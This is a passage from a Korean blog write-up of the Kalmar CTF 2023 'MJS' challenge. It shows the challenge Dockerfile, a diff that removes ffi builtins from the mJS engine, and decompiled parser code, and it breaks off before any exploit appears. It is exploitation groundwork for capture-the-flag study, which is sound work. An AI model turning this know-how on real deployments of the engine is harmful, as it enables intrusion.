<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Kalmar CTF 2023 - MJS | msh1307</title>
<meta name="keywords" content="Kalmar CTF 2023, MJS js engine">
<meta name="description" content="MJS CTF 당시에는 warm-up인데 자바스크립트 엔진이라 도망갔다. 구글링 잘했으면 바로 풀 수 있었을 것 같다.
Analysis FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update RUN apt-get install -y xinetd python3 xxd COPY mjs / COPY ynetd / COPY remote.py / RUN echo &#34;kalmar{redacted}&#34; &gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txt USER 1000:1000 EXPOSE 10002 CMD ./ynetd -p 10002 &#34;timeout 60 ./remote.py&#34; 22.04이다.
diff --git a/Makefile b/Makefile index d265d7e..d495e84 100644 --- a/Makefile &#43;&#43;&#43; b/Makefile @@ -5,6 &#43;5,7 @@ BUILD_DIR = build RD ?">
<meta name="author" content="">
<link rel="canonical" href="https://msh1307.kr/blog/kalmar_ctf_2023_mjs/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-BR89V2WEC0');
</script>
<link rel="icon" href="https://msh1307.kr/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Kalmar CTF 2023 - MJS" />
<meta property="og:description" content="MJS CTF 당시에는 warm-up인데 자바스크립트 엔진이라 도망갔다. 구글링 잘했으면 바로 풀 수 있었을 것 같다.
Analysis FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update RUN apt-get install -y xinetd python3 xxd COPY mjs / COPY ynetd / COPY remote.py / RUN echo &#34;kalmar{redacted}&#34; &gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txt USER 1000:1000 EXPOSE 10002 CMD ./ynetd -p 10002 &#34;timeout 60 ./remote.py&#34; 22.04이다.
diff --git a/Makefile b/Makefile index d265d7e..d495e84 100644 --- a/Makefile &#43;&#43;&#43; b/Makefile @@ -5,6 &#43;5,7 @@ BUILD_DIR = build RD ?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://msh1307.kr/blog/kalmar_ctf_2023_mjs/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2023-03-13T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-03-13T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Kalmar CTF 2023 - MJS"/>
<meta name="twitter:description" content="MJS CTF 당시에는 warm-up인데 자바스크립트 엔진이라 도망갔다. 구글링 잘했으면 바로 풀 수 있었을 것 같다.
Analysis FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update RUN apt-get install -y xinetd python3 xxd COPY mjs / COPY ynetd / COPY remote.py / RUN echo &#34;kalmar{redacted}&#34; &gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txt USER 1000:1000 EXPOSE 10002 CMD ./ynetd -p 10002 &#34;timeout 60 ./remote.py&#34; 22.04이다.
diff --git a/Makefile b/Makefile index d265d7e..d495e84 100644 --- a/Makefile &#43;&#43;&#43; b/Makefile @@ -5,6 &#43;5,7 @@ BUILD_DIR = build RD ?"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Blogs",
      "item": "https://msh1307.kr/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Kalmar CTF 2023 - MJS",
      "item": "https://msh1307.kr/blog/kalmar_ctf_2023_mjs/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Kalmar CTF 2023 - MJS",
  "name": "Kalmar CTF 2023 - MJS",
  "description": "MJS CTF 당시에는 warm-up인데 자바스크립트 엔진이라 도망갔다. 구글링 잘했으면 바로 풀 수 있었을 것 같다.\nAnalysis FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update RUN apt-get install -y xinetd python3 xxd COPY mjs / COPY ynetd / COPY remote.py / RUN echo \u0026#34;kalmar{redacted}\u0026#34; \u0026gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txt USER 1000:1000 EXPOSE 10002 CMD ./ynetd -p 10002 \u0026#34;timeout 60 ./remote.py\u0026#34; 22.04이다.\ndiff --git a/Makefile b/Makefile index d265d7e..d495e84 100644 --- a/Makefile +++ b/Makefile @@ -5,6 +5,7 @@ BUILD_DIR = build RD ?",
  "keywords": [
    "Kalmar CTF 2023", "MJS js engine"
  ],
  "articleBody": "MJS CTF 당시에는 warm-up인데 자바스크립트 엔진이라 도망갔다. 구글링 잘했으면 바로 풀 수 있었을 것 같다.\nAnalysis FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update RUN apt-get install -y xinetd python3 xxd COPY mjs / COPY ynetd / COPY remote.py / RUN echo \"kalmar{redacted}\" \u003e /flag-$(head -c 16 /dev/urandom | xxd -p).txt USER 1000:1000 EXPOSE 10002 CMD ./ynetd -p 10002 \"timeout 60 ./remote.py\" 22.04이다.\ndiff --git a/Makefile b/Makefile index d265d7e..d495e84 100644 --- a/Makefile +++ b/Makefile @@ -5,6 +5,7 @@ BUILD_DIR = build RD ?= docker run -v $(CURDIR):$(CURDIR) --user=$(shell id -u):$(shell id -g) -w $(CURDIR) DOCKER_GCC ?= $(RD) mgos/gcc DOCKER_CLANG ?= $(RD) mgos/clang +CC = clang include $(SRCPATH)/mjs_sources.mk @@ -81,7 +82,7 @@ CFLAGS += $(COMMON_CFLAGS) # NOTE: we compile straight from sources, not from the single amalgamated file, # in order to make sure that all sources include the right headers $(PROG): $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) $(TOP_HEADERS) $(BUILD_DIR) -\t$(DOCKER_CLANG) clang $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG) +\t$(CC) $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG) $(BUILD_DIR): mkdir -p $@ diff --git a/src/mjs_builtin.c b/src/mjs_builtin.c index 6f51e08..36c2b43 100644 --- a/src/mjs_builtin.c +++ b/src/mjs_builtin.c @@ -137,12 +137,12 @@ void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) { mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_load)); mjs_set(mjs, obj, \"print\", ~0, mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_print)); - mjs_set(mjs, obj, \"ffi\", ~0, - mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); - mjs_set(mjs, obj, \"ffi_cb_free\", ~0, - mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); - mjs_set(mjs, obj, \"mkstr\", ~0, - mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); + /* mjs_set(mjs, obj, \"ffi\", ~0, */ + /* mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */ + /* mjs_set(mjs, obj, \"ffi_cb_free\", ~0, */ + /* mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */ + /* mjs_set(mjs, obj, \"mkstr\", ~0, */ + /* mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */ mjs_set(mjs, obj, \"getMJS\", ~0, mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_get_mjs)); mjs_set(mjs, obj, \"die\", ~0, @@ -151,8 +151,8 @@ void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) { mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_do_gc)); mjs_set(mjs, obj, \"chr\", ~0, mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_chr)); - mjs_set(mjs, obj, \"s2o\", ~0, - mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); + /* mjs_set(mjs, obj, \"s2o\", ~0, */ + /* mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */ /* * Populate JSON.parse() and JSON.stringify() diff --git a/src/mjs_exec.c b/src/mjs_exec.c index bd48fea..24c2c7c 100644 --- a/src/mjs_exec.c +++ b/src/mjs_exec.c @@ -835,7 +835,7 @@ MJS_PRIVATE mjs_err_t mjs_execute(struct mjs *mjs, size_t off, mjs_val_t *res) { *func = MJS_UNDEFINED; // Return value // LOG(LL_VERBOSE_DEBUG, (\"CALLING %d\", i + 1)); - } else if (mjs_is_string(*func) || mjs_is_ffi_sig(*func)) { + } else if (mjs_is_ffi_sig(*func)) { /* Call ffi-ed function */ call_stack_push_frame(mjs, bp.start_idx + i, retval_stack_idx); patch.diff가 주어진다.\nhttps://github.com/cesanta/mjs diff.patch is just hardening :) README.txt가 주어졌다. diff.patch는 그냥 hardening 이라고 한다.\nhttps://github.com/cesanta/mjs 깃허브에 들어가보면 diff에서 ffi를 왜 없애는지 알 수 있다.\n$ ./build/mjs -e 'ffi(\"double sin(double)\")(1.23)' 0.942489 다음과 같이 쓸 수 있어서, system으로 바로 따는걸 막기 위해서 일부러 없애놓은 것 같다.\nmjs_err_t __cdecl mjs_exec_internal(mjs *mjs, const char *path, const char *code, int generate_jsc, mjs_val_t *res) { size_t v5; // rax int v6; // eax char *v7; // rax _QWORD v9[2]; // [rsp+0h] [rbp-B0h] BYREF mjs *v10; // [rsp+10h] [rbp-A0h] char *filename; // [rsp+18h] [rbp-98h] __int64 v12; // [rsp+20h] [rbp-90h] FILE *fp; // [rsp+28h] [rbp-88h] char *data; // [rsp+30h] [rbp-80h] size_t size; // [rsp+38h] [rbp-78h] BYREF mjs_bcode_part *bp_0; // [rsp+40h] [rbp-70h] unsigned __int64 __vla_expr0; // [rsp+48h] [rbp-68h] _QWORD *v18; // [rsp+50h] [rbp-60h] const char *jscext; // [rsp+58h] [rbp-58h] int read_mmapped; // [rsp+64h] [rbp-4Ch] int rewrite; // [rsp+68h] [rbp-48h] int basename_len; // [rsp+6Ch] [rbp-44h] const char *jsext; // [rsp+70h] [rbp-40h] mjs_val_t r; // [rsp+78h] [rbp-38h] BYREF size_t off; // [rsp+80h] [rbp-30h] mjs_val_t *resa; // [rsp+88h] [rbp-28h] int generate_jsca; // [rsp+94h] [rbp-1Ch] const char *JS_CODE; // [rsp+98h] [rbp-18h] const char *patha; // [rsp+A0h] [rbp-10h] mjs *mjsa; // [rsp+A8h] [rbp-8h] mjsa = mjs; patha = path; // JS_CODE = code; generate_jsca = generate_jsc; resa = res; off = mjs-\u003ebcode_len; r = 0xFFF3000000000000LL; mjs-\u003eerror = mjs_parse(path, code, mjs); if ( cs_log_level_0 \u003e= 4 ) mjs_dump(mjsa, 1); if ( generate_jsca == -1 ) generate_jsca = (*((_BYTE *)mjsa + 464) \u0026 4) != 0; if ( mjsa-\u003eerror == MJS_OK ) { if ( generate_jsca ) { if ( patha ) { jsext = \".js\"; v12 = (int)strlen(patha); basename_len = v12 - strlen(\".js\"); if ( basename_len \u003e 0 \u0026\u0026 !strcmp(\u0026patha[basename_len], jsext) ) { rewrite = 1; read_mmapped = 1; jscext = \".jsc\"; v9[1] = basename_len; v5 = strlen(\".jsc\"); v18 = v9; filename = (char *)v9 - ((basename_len + v5 + 16) \u0026 0xFFFFFFFFFFFFFFF0LL); __vla_expr0 = basename_len + v5 + 1; memcpy(filename, patha, basename_len); strcpy(\u0026filename[basename_len], jscext); v10 = mjsa; v6 = mjs_bcode_parts_cnt(mjsa); bp_0 = mjs_bcode_part_get(v10, v6 - 1); data = cs_mmap_file(filename, \u0026size); if ( data ) { if ( size == bp_0-\u003edata.len \u0026\u0026 !memcmp(data, bp_0-\u003edata.p, size) ) rewrite = 0; munmap(data, size); } if ( rewrite ) { fp = fopen64(filename, \"wb\"); if ( fp ) { fwrite(bp_0-\u003edata.p, bp_0-\u003edata.len, 1uLL, fp); fclose(fp); } else { if ( cs_log_print_prefix(LL_WARN, \"src/mjs_exec.c\", 1054) ) cs_log_printf(\"Failed to open %s for writing\", filename); read_mmapped = 0; } } if ( read_mmapped ) { free((void *)bp_0-\u003edata.p); v7 = cs_mmap_file(filename, \u0026bp_0-\u003edata.len); bp_0-\u003edata.p = v7; *((_BYTE *)bp_0 + 24) = *((_BYTE *)bp_0 + 24) \u0026 0xEF | 0x10; } } } } mjs_execute(mjsa, off, \u0026r); mjs_exec_internal 함수의 인자로 path가 주어지는데, 이건 -e 옵션으로 직접 js 코드를 주면, 문자열의 주소가 된다. code는 말 그대로 js code의 포인터이다. mjs는 그냥 mjs 객체이다.\nmjs_parse와 mjs_execute가 분석해야할 주요 함수이다. 간단하게 기능을 알아보자면, mjs_parse는 문법을 분석해서 바이트 코드를 점화해서 mjs 객체에 추가해놓는다. 그리고 mjs_execute는 점화된 바이트 코드를 실행한다.\nmjs_parse mjs_err_t __cdecl mjs_parse(const char *path, const char *CODE_, mjs *mjs) { size_t v3; // rax mjs *a; // [rsp+8h] [rbp-B8h] const char *v6; // [rsp+10h] [rbp-B0h] int map_len; // [rsp+24h] [rbp-9Ch] size_t llen; // [rsp+28h] [rbp-98h] size_t start_idx; // [rsp+30h] [rbp-90h] pstate p; // [rsp+38h] [rbp-88h] BYREF mjs_err_t res; // [rsp+A4h] [rbp-1Ch] mjs *mjsa; // [rsp+A8h] [rbp-18h] const char *CODE; // [rsp+B0h] [rbp-10h] const char *patha; // [rsp+B8h] [rbp-8h] patha = path; CODE = CODE_; mjsa = mjs; res = MJS_OK; pinit(path, CODE_, \u0026p); p.mjs = mjsa; p.cur_idx = mjsa-\u003ebcode_gen.len; emit_byte(\u0026p, 0x24u); // OP_BCODE_HEADER = 0x24 start off start_idx = p.mjs-\u003ebcode_gen.len; mbuf_append(\u0026p.mjs-\u003ebcode_gen, 0LL, 0xCuLL); a = p.mjs; v6 = patha; v3 = strlen(patha); mbuf_append(\u0026a-\u003ebcode_gen, v6, v3 + 1); *(_DWORD *)\u0026p.mjs-\u003ebcode_gen.buf[start_idx + 4] = p.mjs-\u003ebcode_gen.len - start_idx; p.start_bcode_idx = p.mjs-\u003ebcode_gen.len; p.cur_idx = p.mjs-\u003ebcode_gen.len; res = parse_statement_list(\u0026p, 0); emit_byte(\u0026p, 0x23u); // OP_EXIT *(_DWORD *)\u0026p.mjs-\u003ebcode_gen.buf[start_idx + 8] = p.mjs-\u003ebcode_gen.len - start_idx; map_len = p.offset_lineno_map.len; llen = cs_varint_llen(SLODWORD(p.offset_lineno_map.len)); mbuf_resize(\u0026p.mjs-\u003ebcode_gen, llen + p.mjs-\u003ebcode_gen.size); cs_varint_encode(map_len, (uint8_t *)\u0026p.mjs-\u003ebcode_gen.buf[p.mjs-\u003ebcode_gen.len], llen); p.mjs-\u003ebcode_gen.len += llen; mbuf_append(\u0026p.mjs-\u003ebcode_gen, p.offset_lineno_map.buf, p.offset_lineno_map.len); *(_DWORD *)\u0026p.mjs-\u003ebcode_gen.buf[start_idx] = p.mjs-\u003ebcode_gen.len - start_idx; mbuf_free(\u0026p.offset_lineno_map); if ( res ) mbuf_free(\u0026mjsa-\u003ebcode_gen); else mjs_bcode_commit(mjsa); return res; } mjs_parse 함수의 모습이다. pinit은 pstate를 초기화해주는 함수이다.\n00000000 pstate struc ; (sizeof=0x68, align=0x8, copyof_117) 00000000 ; XREF: mjs_parse/r 00000000 ; parse_return/r ... 00000000 file_name dq ? ; offset 00000008 buf dq ? ; offset 00000010 pos dq ? ; offset 00000018 line_no dd ? 0000001C last_emitted_line_no dd ? 00000020 offset_lineno_map mbuf ? ; XREF: mjs_parse+142/r 00000020 ; mjs_parse+1B0/r ... 00000038 prev_tok dd ? 0000003C db ? ; undefined 0000003D db ? ; undefined 0000003E db ? ; undefined 0000003F db ? ; undefined 00000040 tok tok ? 00000050 mjs dq ? ; XREF: mjs_parse+36/w 00000050 ; mjs_parse+3A/r ... ; offset 00000058 start_bcode_idx dd ? ; XREF: mjs_parse+E5/w 0000005C cur_idx dd ? ; XREF: mjs_parse+42/w 0000005C ; mjs_parse+F0/w 00000060 depth dd ? 00000064 db ? ; undefined 00000065 db ? ; undefined 00000066 db ? ; undefined 00000067 db ? ; undefined 00000068 pstate ends 00000068 pstate 구조체는 위와 같다.\n초기화가 잘 된다음에, parse_statement_list 함수로 들어간다. 이 함수가 제일 중요한 함수다.\nmjs_err_t __cdecl parse_statement_list(pstate *p, int et) { bool v3; // [rsp+Bh] [rbp-15h] int drop; // [rsp+Ch] [rbp-14h] mjs_err_t res; // [rsp+10h] [rbp-10h] res = MJS_OK; drop = 0; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 147) ) cs_log_printf(\" PNEXT %d\", 147LL); pnext(p); // cur_tok = 0xCA -\u003e STR while ( 1 ) // 8,9 () { v3 = 0; if ( res == MJS_OK ) { v3 = 0; if ( p-\u003etok.tok ) v3 = p-\u003etok.tok != et; } if ( !v3 ) break; if ( drop ) emit_byte(p, 1u); res = parse_statement(p); drop = 1; while ( p-\u003etok.tok == 3 ) { if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 152) ) cs_log_printf(\" PNEXT %d\", 152LL); pnext(p); } } if ( !drop ) emit_byte(p, 0x11u); return res; } pnext 함수는 다음 코드의 부분까지 파싱하는 함수다.\nint __cdecl pnext(pstate *p) { unsigned int tok; // [rsp+0h] [rbp-10h] int toka; // [rsp+0h] [rbp-10h] int tmp; // [rsp+4h] [rbp-Ch] int tmpa; // [rsp+4h] [rbp-Ch] tok = 1; skip_spaces_and_comments(p); p-\u003etok.ptr = p-\u003epos; p-\u003etok.len = 1; if ( *p-\u003epos ) { if ( mjs_is_digit(*p-\u003epos) ) { tok = getnum(p); } else if ( *p-\u003epos == '\\'' || *p-\u003epos == '\"' ) { tok = getstr(p); } else if ( mjs_is_ident(*p-\u003epos) ) { toka = getident(p); // GET ALPHABET KEYWORLD ex) let a tok = toka + is_reserved_word_token(p-\u003etok.ptr, p-\u003etok.len);// 32 reserved WORDS } else if ( strchr(\",.:;{}[]()?\", *p-\u003epos) ) { tok = *p-\u003epos; } else { tmp = longtok3(p, '\u003c', '\u003c', '='); if ( tmp ) goto LABEL_24; tmp = longtok3(p, '\u003e', '\u003e', '='); if ( tmp ) goto LABEL_24; tmp = longtok4(p, '\u003e', '\u003e', '\u003e', '='); if ( tmp ) goto LABEL_24; tmp = longtok3(p, '\u003e', '\u003e', '\u003e'); if ( tmp ) goto LABEL_24; tmp = longtok3(p, '=', '=', '='); if ( tmp || (tmp = longtok3(p, 33, 61, 61)) != 0 || (tmp = longtok(p, \"\u0026\", \"\u0026=\")) != 0 || (tmp = longtok(p, \"|\", \"|=\")) != 0 || (tmp = longtok(p, \"\u003c\", \"\u003c=\")) != 0 || (tmp = longtok(p, \"\u003e\", \"\u003e=\")) != 0 || (tmp = longtok(p, \"-\", \"-=\")) != 0 || (tmp = longtok(p, \"+\", \"+=\")) != 0 ) { LABEL_24: tok = tmp; } else { tmpa = longtok(p, \"^~+-%/*\u003c\u003e=!|\u0026\", \"=\"); if ( tmpa ) tok = tmpa; } } } else { tok = 0; } if ( *p-\u003epos ) ++p-\u003epos; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_tok.c\", 250) ) cs_log_printf(\" --\u003e %d [%.*s]\", tok, p-\u003etok.len, p-\u003etok.ptr); p-\u003eprev_tok = p-\u003etok.tok; p-\u003etok.tok = ptranslate(tok); // 8,9 -\u003e () return p-\u003etok.tok; } 이런식으로 세미콜론을 기준으로 자르거나 하면서 파싱을 해준다.\nint __cdecl ptranslate(enum mjs_TOK tok) { switch ( tok ) { case 0x21: return 22; case 0x25: return 16; case 0x26: return 17; case 0x28: return 8; case 0x29: return 9; case 0x2A: return 12; case 0x2B: return 13; case 0x2C: return 4; case 0x2D: return 14; case 0x2E: return 20; case 0x2F: return 15; case 0x3A: return 2; case 0x3B: return 3; case 0x3C: return 24; case 0x3D: return 5; case 0x3E: return 25; case 0x3F: return 21; case 0x5B: return 10; case 0x5D: return 11; case 0x5E: return 19; case 0x7B: return 6; case 0x7C: return 18; case 0x7D: return 7; case 0x7E: return 23; case 0x213D: return 39; case 0x253D: return 36; case 0x2626: return 42; case 0x263D: return 34; case 0x2A3D: return 32; case 0x2B2B: return 29; case 0x2B3D: return 30; case 0x2D2D: return 28; case 0x2D3D: return 31; case 0x2F3D: return 33; case 0x3C3C: return 26; case 0x3C3D: return 40; case 0x3D3D: return 38; case 0x3E3D: return 41; case 0x3E3E: return 27; case 0x5E3D: return 37; case 0x7C3D: return 35; case 0x7C7C: return 43; case 0x213D3D: return 45; case 0x3C3C3D: return 46; case 0x3D3D3D: return 44; case 0x3E3E3D: return 47; case 0x3E3E3E: return 48; case 0x3E3E3E3D: return 49; } return tok; } 이건 그냥 tok에 맞는게 있으면, 그걸 리턴해준다. 이부분은 소스코드를 보는게 더 이해가 잘된다.\nstatic int ptranslate(int tok) { #define DT(a, b) ((a) \u003c\u003c 8 | (b)) #define TT(a, b, c) ((a) \u003c\u003c 16 | (b) \u003c\u003c 8 | (c)) #define QT(a, b, c, d) ((a) \u003c\u003c 24 | (b) \u003c\u003c 16 | (c) \u003c\u003c 8 | (d)) /* Map token ID produced by mjs_tok.c to token ID produced by lemon */ /* clang-format off */ switch (tok) { case ':': return TOK_COLON; case ';': return TOK_SEMICOLON; case ',': return TOK_COMMA; case '=': return TOK_ASSIGN; case '{': return TOK_OPEN_CURLY; case '}': return TOK_CLOSE_CURLY; case '(': return TOK_OPEN_PAREN; case ')': return TOK_CLOSE_PAREN; case '[': return TOK_OPEN_BRACKET; case ']': return TOK_CLOSE_BRACKET; case '*': return TOK_MUL; case '+': return TOK_PLUS; case '-': return TOK_MINUS; case '/': return TOK_DIV; case '%': return TOK_REM; case '\u0026': return TOK_AND; case '|': return TOK_OR; case '^': return TOK_XOR; case '.': return TOK_DOT; case '?': return TOK_QUESTION; case '!': return TOK_NOT; case '~': return TOK_TILDA; case '\u003c': return TOK_LT; case '\u003e': return TOK_GT; case DT('\u003c','\u003c'): return TOK_LSHIFT; case DT('\u003e','\u003e'): return TOK_RSHIFT; case DT('-','-'): return TOK_MINUS_MINUS; case DT('+','+'): return TOK_PLUS_PLUS; case DT('+','='): return TOK_PLUS_ASSIGN; case DT('-','='): return TOK_MINUS_ASSIGN; case DT('*','='): return TOK_MUL_ASSIGN; case DT('/','='): return TOK_DIV_ASSIGN; case DT('\u0026','='): return TOK_AND_ASSIGN; case DT('|','='): return TOK_OR_ASSIGN; case DT('%','='): return TOK_REM_ASSIGN; case DT('^','='): return TOK_XOR_ASSIGN; case DT('=','='): return TOK_EQ; case DT('!','='): return TOK_NE; case DT('\u003c','='): return TOK_LE; case DT('\u003e','='): return TOK_GE; case DT('\u0026','\u0026'): return TOK_LOGICAL_AND; case DT('|','|'): return TOK_LOGICAL_OR; case TT('=','=','='): return TOK_EQ_EQ; case TT('!','=','='): return TOK_NE_NE; case TT('\u003c','\u003c','='): return TOK_LSHIFT_ASSIGN; case TT('\u003e','\u003e','='): return TOK_RSHIFT_ASSIGN; case TT('\u003e','\u003e','\u003e'): return TOK_URSHIFT; case QT('\u003e','\u003e','\u003e','='): return TOK_URSHIFT_ASSIGN; } /* clang-format on */ return tok; } mjs_err_t __cdecl parse_statement(pstate *p) { int tok; // [rsp+8h] [rbp-18h] mjs_err_t res; // [rsp+Ch] [rbp-14h] if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 900) ) cs_log_printf(\"[%.*s]\", 10, p-\u003etok.ptr); tok = p-\u003etok.tok; switch ( tok ) { case 3: emit_byte(p, 0x11u); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 904) ) cs_log_printf(\" PNEXT %d\", 904LL); goto LABEL_34; case 6: return parse_block(p, 1); case 0xCB: emit_byte(p, 0x11u); emit_byte(p, 0x20u); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 919) ) cs_log_printf(\" PNEXT %d\", 919LL); goto LABEL_34; } if ( (unsigned int)(tok - 0xCC) \u003c 2 ) goto LABEL_36; if ( tok == 0xCE ) { emit_byte(p, 0x21u); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 923) ) cs_log_printf(\" PNEXT %d\", 923LL); LABEL_34: pnext(p); return 0; } if ( (unsigned int)(tok - 0xD1) \u003c 2 ) goto LABEL_36; if ( tok == 0xD6 ) return parse_for(p); if ( tok == 0xD8 ) return parse_if(p); if ( (unsigned int)(tok - 0xDA) \u003c 2 ) goto LABEL_36; if ( tok == 0xDD ) return parse_return(p); if ( tok == 0xDE || tok == 0xE0 || tok == 0xE2 || (unsigned int)(tok - 0xE4) \u003c 2 ) goto LABEL_36; switch ( tok ) { case 0xE6: return parse_while(p); case 0xE7: LABEL_36: mjs_set_errorf(p-\u003emjs, MJS_SYNTAX_ERROR, \"[%.*s] is not implemented\", (unsigned int)p-\u003etok.len, p-\u003etok.ptr); return 1; case 0xE8: return parse_let(p); } while ( 1 ) { res = parse_expr(p); if ( res ) return res; if ( p-\u003etok.tok != 4 ) break; emit_byte(p, 1u); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 948) ) cs_log_printf(\" PNEXT %d\", 948LL); pnext(p); } return 0; } parse_statement 함수는 tok에 따라 잘 파싱을 해서 바이트 코드를 점화하는 함수다. 마지막에 parse_expr 함수를 호출한다.\nparse_expr 함수는 말 그대로 expression을 파싱하는 함수다. ternary, logical_or, logical_and, bitwise_or … shift, plus, minus … unary 이런식으로 함수를 계속 호출한다. 즉 그냥 연산자 우선순위를 구현한거라고 보면 된다.\nmjs_err_t __cdecl parse_expr(pstate *p) { return parse_assignment(p, 0); } mjs_err_t __cdecl parse_assignment(pstate *p, int prev_op) { int op; // [rsp+4h] [rbp-1Ch] mjs_err_t res; // [rsp+8h] [rbp-18h] mjs_err_t resa; // [rsp+8h] [rbp-18h] res = parse_ternary(p, 0); if ( res == MJS_OK ) { if ( findtok(\u0026s_assign_ops, p-\u003etok.tok) ) { op = p-\u003etok.tok; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 503) ) cs_log_printf(\" PNEXT %d\", 503LL); pnext(p); resa = parse_assignment(p, 0); if ( resa ) return resa; emit_op(p, op); } return 0; } return res; } 삼항 연산자를 먼저 파싱한다.\nmjs_err_t __cdecl parse_ternary(pstate *p, int prev_op) { size_t off_else; // [rsp+0h] [rbp-30h] size_t off_endif; // [rsp+8h] [rbp-28h] size_t off_endifa; // [rsp+8h] [rbp-28h] size_t off_if; // [rsp+10h] [rbp-20h] mjs_err_t res; // [rsp+18h] [rbp-18h] mjs_err_t resa; // [rsp+18h] [rbp-18h] mjs_err_t resb; // [rsp+18h] [rbp-18h] res = parse_logical_or(p, 0); if ( res == MJS_OK ) { if ( prev_op ) emit_op(p, prev_op); if ( p-\u003etok.tok == 21 ) { if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 470) ) cs_log_printf(\" PNEXT %d\", 470LL); pnext(p); emit_byte(p, 7u); off_if = p-\u003ecur_idx; emit_init_offset(p); resa = parse_ternary(p, 0); if ( resa ) return resa; emit_byte(p, 4u); off_else = p-\u003ecur_idx; emit_init_offset(p); off_endif = p-\u003ecur_idx; emit_byte(p, 1u); if ( p-\u003etok.tok != 2 ) { mjs_set_errorf( p-\u003emjs, MJS_SYNTAX_ERROR, \"parse error at line %d: [%.*s]\", (unsigned 